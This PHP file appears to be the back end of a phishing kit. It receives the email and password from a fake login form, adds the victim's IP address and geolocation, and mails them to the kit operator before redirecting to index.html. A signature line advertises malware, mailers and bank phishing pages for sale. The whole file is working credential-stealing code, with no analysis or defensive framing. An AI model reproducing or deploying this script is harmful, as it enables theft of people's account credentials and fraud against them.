<?php
$error_message = ""; $success = "";
if (isset($_POST['email']) && isset($_POST['password'])) {
  $email = $_POST['email'];
  $password = $_POST['password'];

  if (!empty($email) && !empty($password)) {
$adddate = date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$headers = "From: Php \n" .
$headers .= "MIME-Version: 1.0\n";

require_once('geoplugin.class.php');
require ('Email.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message .= "------------|Written By PHP Bloke|------------\n";
$message .= "Email ID    : " . $_POST['email'] . "\n"; 
$message .= "Password    : " . $_POST['password'] . "\n"; 
$message .= "IP          : " .$ip. "\n"; 
$message .= "Date & Time : $adddate\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "------------------------------------------------\n";
$message .= "For Your Virus, SMTP, Php mailer, Page, AWS SES, Bank, Courier etc, Contact phplogs@yandex.com";
$subject = "Ali Report 2022 | ".$ip."\n";
if (mail($recipient,$subject,$message,$headers)) {
   header("Location:  index.html");
  }
else {
  $error_message.= "sorry, an error occurred. please try again later.";
  }
  } else {
    $error_message.= "Fill Email/Password field.";
  }
}
?>